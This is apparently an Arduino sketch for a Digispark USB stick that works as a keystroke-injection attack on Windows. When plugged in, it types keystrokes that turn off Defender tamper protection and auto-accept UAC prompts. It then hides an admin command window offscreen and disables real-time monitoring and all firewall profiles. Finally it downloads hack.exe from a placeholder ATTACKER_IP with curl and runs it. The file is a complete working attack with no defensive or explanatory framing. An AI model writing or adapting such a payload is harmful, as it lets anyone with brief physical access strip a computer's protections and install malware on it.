#include "DigiKeyboard.h"

#define KEY_ESC      41
#define KEY_TAB      43
#define KEY_F4       61
#define KEY_DOWN     0x51 

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("tamper protection");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC

  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(300); // close the current window
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); // make very smol window
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT); // run as admin
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // UAC BYPASS
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.delay(400);
  DigiKeyboard.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("curl http://ATTACKER_IP/hack.exe --output h.exe");
  DigiKeyboard.delay(1500);
  DigiKeyboard.println(".\\h");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");

  while(true){
    digitalWrite(1, HIGH); //Turn on LED Light
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
  }
  for(;;){} // stop process from looping

}
